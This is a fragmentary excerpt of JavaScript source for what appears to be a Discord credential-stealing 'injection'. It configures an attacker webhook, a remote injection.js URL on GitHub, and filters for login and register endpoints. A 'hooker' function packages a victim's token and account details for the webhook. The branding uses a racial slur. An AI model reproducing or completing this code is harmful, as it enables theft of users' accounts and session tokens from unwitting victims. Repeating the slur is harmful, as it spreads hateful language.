...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/dijigavo/llf/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "CursedNigga - niggcord injection";
    content["avatar_url"] = "https://media.tenor.com/X4xXcYU30NkAAAAd/goat-cursed.gif";
    ...
    content["embeds"][0]["footer"] = {
        "text": "CursedNigga discord injection - made by Dojska",
        "icon_url": "https://media.tenor.com/X4xXcYU30NkAAAAd/goat-cursed.gif",
    };
    ...
    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 0x00000;
    }
